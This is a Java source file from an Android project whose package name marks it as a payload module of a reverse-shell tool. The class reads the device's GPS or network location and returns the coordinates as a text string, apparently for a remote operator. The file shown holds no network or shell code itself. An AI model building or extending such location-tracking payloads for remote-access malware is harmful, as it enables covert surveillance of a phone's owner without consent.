package com.example.reverseshell2.Payloads;

import android.app.Activity;
import android.content.Context;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Bundle;
import android.util.Log;


import static android.content.Context.LOCATION_SERVICE;

public class locationManager {


    Context context;
    Activity activity;

    LocationManager mLocationManager;
    boolean isGPSEnabled = false;
    boolean isNetworkEnabled = false;
    Location location;

    Double latitude;
    Double longitude;

    public locationManager(Context context,Activity activity) {
        this.context = context;
        this.activity = activity;
    }

    public void location_init() {
        mLocationManager = (LocationManager) context.getSystemService(LOCATION_SERVICE);
        isGPSEnabled = mLocationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
        isNetworkEnabled = mLocationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
    }


    public void getNetworkLocation() {
        mLocationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 1000 * 60 * 1, 10, new LocationListener() {
            @Override
            public void onLocationChanged(Location location) {}

            @Override
            public void onStatusChanged(String s, int i, Bundle bundle) {}

            @Override
            public void onProviderEnabled(String s) {}

            @Override
            public void onProviderDisabled(String s) {}
        });

        if (mLocationManager != null) {
            location = mLocationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);

            if (location != null) {
                latitude = location.getLatitude();
                longitude = location.getLongitude();
            }
        }
    }

    public void getGPSLocation() {
        activity.runOnUiThread(new Runnable() {
            @Override
            public void run() {
        mLocationManager.requestLocationUpdates(
                LocationManager.GPS_PROVIDER, 1000 * 60 * 1, 10, new LocationListener() {
                    @Override
                    public void onLocationChanged(Location location) {}

                    @Override
                    public void onStatusChanged(String s, int i, Bundle bundle) {}

                    @Override
                    public void onProviderEnabled(String s) {}

                    @Override
                    public void onProviderDisabled(String s) {}
                });
            }
        });

        if (mLocationManager != null) {
            location = mLocationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);

            if (location != null) {
                latitude = location.getLatitude();
                longitude = location.getLongitude();
            }
        }

    }

    public String getLocation() {

        String result = "";
        String lat = "";
        String lon = "";
        String whichOne="";
        location_init();

        if (isNetworkEnabled && isGPSEnabled) {
            getGPSLocation();
            whichOne="GPS Location\n";
            if (latitude != null && longitude != null) {
                 lat = latitude.toString() + "\n";
                 lon = longitude.toString() + "\n";
                Log.d("lot3", lat);
            }

        } else if (isGPSEnabled) {
            getGPSLocation();
            whichOne="GPS Location\n";
            if (latitude != null && longitude != null) {
                 lat = latitude.toString() + "\n";
                 lon = longitude.toString() + "\n";
                Log.d("lot1", lat);
            }

        } else if (isNetworkEnabled) {
            activity.runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    getNetworkLocation();
                }
            });
            whichOne="Network Location\n";
            if (latitude != null && longitude != null) {
                 lat = latitude.toString() + "\n";
                 lon = longitude.toString() + "\n";
                Log.d("lot2", lat);
            }
        }
        if(!lat.isEmpty() && !lon.isEmpty()){
            result = whichOne+"Latitude is "+lat+"Longitude is "+lon;
        }else{
            result = "Not able to get Network Location and GPS is disbled\n";
        }
        return result;
    }


}
